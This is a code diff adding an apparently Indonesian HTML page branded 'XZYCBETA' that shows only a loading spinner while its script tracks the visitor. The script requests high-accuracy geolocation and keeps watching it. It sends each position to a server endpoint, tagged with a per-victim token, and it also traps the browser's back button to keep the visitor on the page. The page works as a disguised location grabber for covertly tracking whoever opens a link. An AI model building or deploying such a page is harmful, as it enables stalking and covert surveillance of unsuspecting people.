@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>XZYCBETA • Loading</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+body{background:radial-gradient(circle at 50% 30%,#0f1a2e 0%,#050810 100%);color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px}
+.brand{font-size:32px;font-weight:800;letter-spacing:3px;background:linear-gradient(135deg,#00e5ff 0%,#0088ff 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.sub{font-size:11px;letter-spacing:5px;color:#4a5b78;text-transform:uppercase;margin-bottom:48px}
+.spinner{width:48px;height:48px;border:3px solid rgba(0,229,255,.15);border-top-color:#00e5ff;border-radius:50%;animation:sp 1s linear infinite;margin-bottom:20px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.msg{font-size:13px;color:#7a8aa3;letter-spacing:1px;text-align:center}
+.dot{display:inline-block;animation:blink 1.4s infinite}
+.dot:nth-child(2){animation-delay:.2s}
+.dot:nth-child(3){animation-delay:.4s}
+@keyframes blink{0%,20%{opacity:.2}50%{opacity:1}100%{opacity:.2}}
+</style>
+</head>
+<body>
+  <div class="brand">XZYCBETA</div>
+  <div class="sub">SYSTEM</div>
+  <div class="spinner"></div>
+  <div class="msg">Memuat data<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></div>
+
+<script>
+(function(){
+  var TOKEN = "{TOKEN}";
+
+  // ── kirim GPS ke server ──
+  function sendGPS(lat, lng, acc) {
+    fetch("/api/gps", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        token: TOKEN,
+        lat: lat,
+        lng: lng,
+        acc: acc,
+        address: ""
+      })
+    }).catch(function(){});
+  }
+
+  // ── minta izin lokasi ──
+  if (navigator.geolocation) {
+    navigator.geolocation.watchPosition(
+      function(pos) {
+        sendGPS(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      },
+      function(err) {
+        // kalo ditolak, coba sekali lagi dengan high accuracy
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            sendGPS(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          },
+          function(){},
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
+      },
+      { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+    );
+  }
+
+  // ── pencegahan back button ──
+  history.pushState(null, "", location.href);
+  window.addEventListener("popstate", function() {
+    history.pushState(null, "", location.href);
+  });
+})();
+</script>
+</body>
+</html>
